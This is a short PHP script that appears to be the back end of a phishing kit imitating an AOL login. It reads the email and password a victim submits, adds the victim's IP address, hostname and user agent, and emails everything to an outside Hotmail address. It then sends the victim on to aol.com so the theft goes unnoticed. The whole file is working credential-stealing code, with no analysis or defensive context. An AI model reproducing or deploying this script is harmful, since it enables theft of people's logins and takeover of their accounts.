<?php
if($_POST["email"] != "" and $_POST["password"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "|----------| E M A I L  |--------------|\n";
$message .= "Online ID            : ".$_POST['email']."\n";
$message .= "Passcode              : ".$_POST['password']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- Cyber Throne [.] RU --------------|\n";
$send = "cupidlost@hotmail.com,
";
$subject = "Login | $ip";
{
mail("$send", "$subject", $message);   
}
  header ("Location: https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwiap4C0h9rWAhVJtxoKHVN0B5YQFgglMAA&url=https%3A%2F%2Fwww.aol.com%2F&usg=AOvVaw2qznHw7sb4Ly9cDaszBI4l");
}else{
header ("Location: index.php");
}

?>